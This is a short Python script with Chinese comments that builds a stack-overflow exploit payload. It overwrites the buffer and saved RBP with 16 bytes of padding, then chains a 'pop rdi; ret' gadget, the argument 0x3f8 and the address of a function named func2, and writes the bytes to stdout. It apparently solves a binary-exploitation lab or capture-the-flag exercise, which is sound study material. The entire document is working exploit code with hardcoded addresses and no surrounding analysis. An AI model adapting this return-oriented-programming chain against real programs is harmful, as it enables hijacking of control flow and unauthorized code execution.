import sys
import struct

# 1. Padding: 覆盖 Buffer(8) + Saved_RBP(8)
padding = b'A' * 16

# 2. ROP Chain
# Gadget: pop %rdi; ret
# 注意：我们直接跳到 0x4012c7，避开函数开头的 push rbp
pop_rdi_addr = 0x4012c7  

# 参数值: 0x3f8
arg_val = 0x3f8

# 目标函数: func2
func2_addr = 0x401216

# 3. 组装 Payload (全部使用 64位 小端序 <Q)
payload = padding
payload += struct.pack('<Q', pop_rdi_addr) # 覆盖原来的返回地址
payload += struct.pack('<Q', arg_val)      # 放在栈上，会被 pop 到 rdi
payload += struct.pack('<Q', func2_addr)   # pop rdi 后的 ret 会跳到这里

# 4. 输出
sys.stdout.buffer.write(payload)